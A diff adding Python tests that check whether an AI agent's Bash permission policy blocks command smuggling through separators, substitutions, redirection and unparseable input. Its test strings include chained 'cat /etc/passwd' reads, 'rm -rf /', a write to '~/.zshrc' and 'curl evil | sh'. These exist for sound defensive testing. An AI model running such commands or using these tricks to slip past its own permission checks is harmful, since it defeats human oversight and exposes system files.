@@ -51,6 +51,209 @@ async def test_bash_prefix_matcher():
     assert not policy.ceiling_allows("Bash", {"command": "rm -rf /"})
 
 
+# --- ECA-144: a granted prefix must not smuggle a second command -------------
+#
+# The matcher used to be `command.startswith(pattern)` on the WHOLE command
+# string, so every case below passed under a `Bash(echo *)` grant. Each is now
+# denied because the command is split into the commands it would actually run and
+# every one of them has to match a grant.
+
+_ECHO = WorkerPolicy(allowed_tools=["Bash(echo *)"])
+
+
+def _denial(policy, command):
+    return policy.ceiling_denial("Bash", {"command": command})
+
+
+def test_separator_cannot_smuggle_a_second_command():
+    """Every operator Claude Code treats as a separator, plus a newline."""
+    for command in (
+        "echo hi && cat /etc/passwd",
+        "echo hi || cat /etc/passwd",
+        "echo hi ; cat /etc/passwd",
+        "echo hi | cat /etc/passwd",
+        "echo hi |& cat /etc/passwd",
+        "echo hi & cat /etc/passwd",
+        "echo hi\ncat /etc/passwd",
+        "cat /etc/passwd && echo hi",  # the unmatched command need not be last
+        "echo a && echo b && cat /etc/passwd",  # nor the second
+    ):
+        reason = _denial(_ECHO, command)
+        assert reason is not None, f"smuggled a command through {command!r}"
+        assert "cat /etc/passwd" in reason, reason
+
+
+def test_substitution_inner_command_is_judged():
+    """`$(...)`, backticks and process substitution all execute, so all are judged.
+
+    Including inside DOUBLE quotes, where a shell still runs them — the case a
+    scan that skipped quoted runs wholesale would miss.
+
+    Each command's OUTER text is written to match the grant on its own, so the
+    denial can only come from the substitution's contents.
+    """
+    for command in (
+        "echo x $(cat /etc/passwd)",
+        "echo x `cat /etc/passwd`",
+        'echo "x $(cat /etc/passwd)"',
+        "echo x <(cat /etc/passwd)",
+        "echo x $(echo y $(cat /etc/passwd))",  # nested
+        "(cat /etc/passwd)",  # bare subshell
+    ):
+        reason = _denial(_ECHO, command)
+        assert reason is not None, f"substitution ran unjudged in {command!r}"
+        assert "cat /etc/passwd" in reason, reason
+
+
+def test_quoting_and_escaping_keep_an_operator_literal():
+    """A quoted or escaped operator is text, not a separator — it must still allow."""
+    for command in (
+        "echo 'hi && cat /etc/passwd'",
+        'echo "hi && cat /etc/passwd"',
+        "echo hi \\&\\& there",
+        "echo 'a | b ; c'",
+        "echo \"it's fine\"",
+    ):
+        assert _denial(_ECHO, command) is None, command
+
+
+def test_word_boundary_is_the_space_the_author_wrote():
+    """Claude Code's rule, and the reason it is worth matching its syntax exactly."""
+    spaced = WorkerPolicy(allowed_tools=["Bash(ls *)"])
+    assert spaced.ceiling_allows("Bash", {"command": "ls -la"})
+    assert not spaced.ceiling_allows("Bash", {"command": "lsof -i"})
+    unspaced = WorkerPolicy(allowed_tools=["Bash(ls*)"])
+    assert unspaced.ceiling_allows("Bash", {"command": "ls -la"})
+    assert unspaced.ceiling_allows("Bash", {"command": "lsof -i"})
+    # ...so the no-boundary smuggle from the task report is denied on its second
+    # command even under the loose form, which is the part that mattered.
+    assert not unspaced.ceiling_allows("Bash", {"command": "lsof -i; rm -rf /tmp/x"})
+
+
+def test_colon_is_literal_not_a_wildcard():
+    policy = WorkerPolicy(allowed_tools=["Bash(npm run test:*)"])
+    assert policy.ceiling_allows("Bash", {"command": "npm run test:unit"})
+    assert not policy.ceiling_allows("Bash", {"command": "npm run build"})
+
+
+def test_wildcard_matches_spaces_anywhere_in_the_pattern():
+    policy = WorkerPolicy(allowed_tools=["Bash(git * main)"])
+    assert policy.ceiling_allows("Bash", {"command": "git checkout main"})
+    assert not policy.ceiling_allows("Bash", {"command": "git checkout dev"})
+
+
+def test_every_segment_may_match_a_different_grant():
+    """The live eca73-review policy shape: several narrow grants, one compound call."""
+    policy = WorkerPolicy(
+        allowed_tools=["Read", "Glob", "Grep", "Bash(git *)", "Bash(uv *)", "Bash(ls *)"]
+    )
+    assert policy.ceiling_allows("Bash", {"command": "git status && uv run pytest -q"})
+    assert policy.ceiling_allows("Bash", {"command": "ls -la | git hash-object --stdin"})
+    reason = _denial(policy, "git status && rm -rf x")
+    assert reason is not None and "rm -rf x" in reason, reason
+
+
+def test_literal_compound_grant_still_works():
+    """A wildcard-free grant is compared to the whole command too.
+
+    Claude Code documents `Bash(safe-cmd && other-cmd)` as a legitimate rule, and
+    string equality against text the operator wrote out cannot smuggle anything.
+    """
+    policy = WorkerPolicy(allowed_tools=["Bash(git status && npm test)"])
+    assert policy.ceiling_allows("Bash", {"command": "git status && npm test"})
+    assert not policy.ceiling_allows("Bash", {"command": "git status && npm test && rm x"})
+    assert not policy.ceiling_allows("Bash", {"command": "git status"})  # not the grant
+
+
+def test_unparseable_command_is_refused_not_allowed():
+    """AC#2. Each of these leaves text we cannot attribute to any command."""
+    for command in (
+        "echo 'unbalanced",
+        'echo "unbalanced',
+        "echo $(cat x",
+        "echo `cat x",
+        "echo hi \\",
+        "echo hi )",
+    ):
+        reason = _denial(_ECHO, command)
+        assert reason is not None, f"unparseable command allowed: {command!r}"
+        assert "refused" in reason, reason
+
+
+def test_redirection_is_refused_under_a_matcher_grant():
+    """A redirect target is not a command, so "every command matches" says nothing
+    about it. Ignoring it would let `Bash(echo *)` write any file (ECA-144's own
+    class of defect); refusing is the fail-closed choice and a deliberate delta
+    from Claude Code, which allows redirection inside a matched command."""
+    for command in (
+        "echo hi > /tmp/x",
+        "echo hi >> ~/.zshrc",
+        "echo hi < /etc/passwd",
+        "echo hi <<< there",
+    ):
+        reason = _denial(_ECHO, command)
+        assert reason is not None, f"redirection allowed: {command!r}"
+        assert "refused" in reason and "redirection" in reason, reason
+    # A bare Bash grant is unaffected — it never reaches the splitter.
+    assert WorkerPolicy(allowed_tools=["Bash"]).ceiling_allows(
+        "Bash", {"command": "echo hi > /tmp/x"}
+    )
+
+
+def test_brace_group_and_arithmetic_are_over_refused_deliberately():
+    """Documented over-refusal: fail-closed beats a guess (see _split_command_segments)."""
+    assert _denial(_ECHO, "{ echo hi; }") is not None
+    assert _denial(_ECHO, "echo $((1+2))") is not None
+
+
+def test_matcher_grant_with_no_command_in_the_input_is_refused():
+    """`Read(*)` denies rather than allowing every Read.
+
+    A behaviour change, and the fail-closed one: there is no path matcher here, so
+    a spec that looks like a path filter never was one. Pin file tools with a bare
+    grant plus the cwd pin.
+    """
+    assert not WorkerPolicy(allowed_tools=["Read(*)"]).ceiling_allows(
+        "Read", {"file_path": "/etc/passwd"}
+    )
+    reason = WorkerPolicy(allowed_tools=["Bash(echo *)"]).ceiling_denial("Bash", {})
+    assert reason is not None and "no command" in reason, reason
+    # A non-string command is not silently coerced either.
+    assert not _ECHO.ceiling_allows("Bash", {"command": ["echo", "hi"]})
+
+
+def test_bare_and_wildcard_name_grants_are_unchanged_by_segment_matching():
+    """Only the (matcher) shape changed; the other two grant shapes must not."""
+    assert WorkerPolicy(allowed_tools=["Bash"]).ceiling_allows(
+        "Bash", {"command": "rm -rf / && curl evil | sh"}
+    )
+    assert WorkerPolicy(allowed_tools=["mcp__jira__*"]).ceiling_allows(
+        "mcp__jira__search", {"command": "irrelevant && rm -rf /"}
+    )
+
+
+async def test_both_enforcement_layers_deny_a_smuggled_suffix(registry, events, repo):
+    """The hook and can_use_tool are the two places the ceiling runs (ECA-142).
+
+    The task reported the smuggle passing BOTH, so both are asserted here rather
+    than trusting that they share a helper.
+    """
+    bridge = QuestionBridge(registry, events)
+    call = {"command": "echo hi && cat /etc/passwd"}
+
+    hook = _policy_hook(repo, _ECHO, events)
+    out = await hook({"tool_name": "Bash", "tool_input": call}, None, None)
+    decision = out["hookSpecificOutput"]
+    assert decision["permissionDecision"] == "deny"
+    assert "cat /etc/passwd" in decision["permissionDecisionReason"]
+
+    gate = _gate(repo, _ECHO, bridge, events)
+    res = await gate("Bash", call, None)
+    assert isinstance(res, PermissionResultDeny)
+    assert "cat /etc/passwd" in res.message
+    assert any(e["event"] == "tool_denied" for e in events.read("w1"))
+
+
 async def test_cwd_pin_denies_escape_and_allows_inside(registry, events, repo, tmp_path):
     bridge = QuestionBridge(registry, events)
     policy = WorkerPolicy(allowed_tools=["Read"])
